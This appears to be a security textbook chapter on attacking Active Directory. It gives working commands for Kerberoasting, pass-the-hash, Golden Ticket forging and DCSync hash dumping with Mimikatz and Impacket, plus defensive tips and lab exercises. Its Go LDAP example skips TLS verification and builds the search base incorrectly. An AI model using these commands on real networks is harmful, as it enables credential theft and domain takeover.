# Chapter 36: Active Directory Attacks — Owning the Domain

*Active Directory (AD) is the central authentication and authorization system in most enterprise Windows networks. Compromising it means compromising every machine in the organization.*

---

## Active Directory Basics

```
AD Components:
├── Forest  — top-level security boundary (collection of domains)
│   └── Domain  — e.g., corp.company.com
│       ├── Users
│       ├── Groups
│       ├── Computers
│       ├── OUs (Organizational Units) — logical containers
│       └── Group Policy Objects (GPOs) — apply settings
│
├── Domain Controllers (DCs) — servers running AD DS
│   ├── Store the AD database (NTDS.dit)
│   └── Handle Kerberos authentication
│
└── Trust Relationships — between forests/domains
```

---

## Kerberos Authentication

Kerberos is the AD authentication protocol. Understanding it is essential for attack/defense:

```
1. User → KDC: "I want to authenticate" (AS_REQ)
   - Encrypted timestamp with user's password hash

2. KDC → User: Ticket Granting Ticket (TGT) (AS_REP)
   - Encrypted with krbtgt account's hash

3. User → KDC: "I want to access server X" (TGS_REQ)
   - Sends TGT

4. KDC → User: Service Ticket (TGS_REP)
   - Encrypted with target service's hash

5. User → Server: Service Ticket
   - Server decrypts with its own hash, authenticates user
```

---

## Initial Recon (from Domain User)

```powershell
# Basic domain info
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# List all users
Get-ADUser -Filter * -Properties *

# List admins
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Enterprise Admins"

# List DCs
Get-ADDomainController -Filter *

# SPNs (for Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Using PowerView (more features)
. .\PowerView.ps1
Get-NetUser
Get-NetGroup "Domain Admins"
Get-NetComputer
Find-LocalAdminAccess   # which machines you have admin on
```

---

## BloodHound — Attack Path Visualization

BloodHound maps relationships in AD to find attack paths:

```bash
# Collect data (on target Windows machine)
# SharpHound — C# collector
.\SharpHound.exe -c All

# Or from Linux using impacket
bloodhound-python -u user -p pass -d corp.company.com -c All -ns 192.168.1.10

# Import collected ZIP into BloodHound GUI
# Query: "Shortest paths to Domain Admins"
# Query: "Find all kerberoastable accounts"
# Query: "Principals with DCSync rights"
```

---

## Kerberoasting

Request service tickets for accounts with SPNs — tickets encrypted with service account's password hash. Crack offline.

```bash
# Using Impacket (from Linux)
GetUserSPNs.py corp.company.com/user:password -dc-ip 192.168.1.10 -request

# Output: $krb5tgs$23$*MSSQLSvc*... (TGS hash)

# Crack with hashcat
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 tgs.hash rockyou.txt -r best64.rule
```

```powershell
# PowerView on Windows
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
```

**Defense:** Use strong (25+ char) service account passwords, audit SPNs, enable "Fine-Grained Password Policy" for service accounts.

---

## AS-REP Roasting

For accounts with "Do not require Kerberos preauthentication" — no need for password to get a crackable hash:

```bash
# Find users without preauth
GetNPUsers.py corp.company.com -usersfile users.txt -format hashcat -no-pass -dc-ip 192.168.1.10

# Outputs: $krb5asrep$23$user@CORP.COMPANY.COM:...

# Crack
hashcat -m 18200 asrep.hash rockyou.txt
```

---

## Pass-the-Hash (PtH)

Use NTLM hash instead of password — no cracking needed:

```bash
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:NTLMHASH

# Impacket
psexec.py -hashes :NTLMHASH corp/admin@192.168.1.100
wmiexec.py -hashes :NTLMHASH corp/admin@192.168.1.100
```

---

## Pass-the-Ticket (PtT)

Export and reuse Kerberos tickets:

```
# Windows — Mimikatz
sekurlsa::tickets /export      # export TGTs
kerberos::ptt ticket.kirbi     # import (pass the ticket)

# Linux — impacket
getTGT.py corp.company.com/admin -hashes :NTLMHASH
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass admin@dc01.corp.company.com
```

---

## Golden Ticket

Forge a TGT using the krbtgt account hash — valid for 10 years, bypasses all password changes:

```
# Dump krbtgt hash (need DA)
mimikatz# lsadump::dcsync /user:krbtgt

# Forge golden ticket
mimikatz# kerberos::golden /user:admin /domain:corp.company.com /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi

# Use it
mimikatz# kerberos::ptt golden.kirbi
```

**Detection:** krbtgt hash request in event logs, tickets with unusual lifetime.

**Defense:** Reset krbtgt password twice (invalidates all existing TGTs).

---

## DCSync

If you have `Replicating Directory Changes` permissions, impersonate a DC and pull all hashes:

```bash
# Mimikatz
mimikatz# lsadump::dcsync /domain:corp.company.com /user:krbtgt
mimikatz# lsadump::dcsync /domain:corp.company.com /all /csv

# Impacket (from Linux)
secretsdump.py -just-dc corp/admin:password@dc01.corp.company.com
```

---

## Go: LDAP User Enumeration

```go
package main

import (
    "crypto/tls"
    "fmt"
    "log"
    
    "github.com/go-ldap/ldap/v3"
)

func enumerateADUsers(dc, domain, user, password string) {
    // Connect to LDAP
    conn, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", dc))
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()
    
    // Upgrade to TLS
    if err := conn.StartTLS(&tls.Config{InsecureSkipVerify: true}); err != nil {
        log.Println("TLS failed, continuing unencrypted:", err)
    }
    
    // Bind (authenticate)
    if err := conn.Bind(fmt.Sprintf("%s@%s", user, domain), password); err != nil {
        log.Fatal("Bind failed:", err)
    }
    
    // Build search base from domain (corp.company.com → DC=corp,DC=company,DC=com)
    base := "DC=" + domain[:len(domain)-4] // simplified
    
    // Search all users with SPNs (Kerberoasting targets)
    searchReq := ldap.NewSearchRequest(
        base,
        ldap.ScopeWholeSubtree,
        ldap.NeverDerefAliases,
        0, 0, false,
        "(&(objectClass=user)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))",
        []string{"sAMAccountName", "servicePrincipalName", "memberOf"},
        nil,
    )
    
    result, err := conn.Search(searchReq)
    if err != nil {
        log.Fatal("Search failed:", err)
    }
    
    fmt.Printf("Kerberoastable accounts:\n")
    for _, entry := range result.Entries {
        fmt.Printf("  %s\n    SPNs: %v\n",
            entry.GetAttributeValue("sAMAccountName"),
            entry.GetAttributeValues("servicePrincipalName"))
    }
}

func main() {
    enumerateADUsers("192.168.1.10", "corp.company.com", "jsmith", "Password1!")
}
```

---

## AD Attack Path

```
1. Foothold       → phishing / external vuln → low-privilege user
2. Recon          → BloodHound, PowerView → map AD
3. Lateral Move   → PtH, PsExec → spread across machines
4. Privilege Esc  → Kerberoasting, token impersonation → DA credentials
5. Domain Domination → DCSync, Golden Ticket → all hashes, persistence
```

---

## Summary

| Attack | What you need | What you get |
|--------|---------------|--------------|
| Kerberoasting | Any domain user | Service account hash (offline crack) |
| AS-REP Roasting | User list | Preauth-disabled user hash |
| Pass-the-Hash | NTLM hash | Code execution as that user |
| Pass-the-Ticket | TGT ticket file | Impersonate user without password |
| DCSync | Replication rights / DA | All domain hashes |
| Golden Ticket | krbtgt hash, domain SID | Forge TGTs forever |

---

## Exercises

1. Set up a home AD lab (Windows Server 2019 + Windows 10 VM, ≈$0 with evaluation licenses)
2. Run BloodHound and identify the shortest path to Domain Admin
3. Perform Kerberoasting in your lab — crack the service account hash
4. Practice DCSync after becoming Domain Admin — what hashes can you extract?
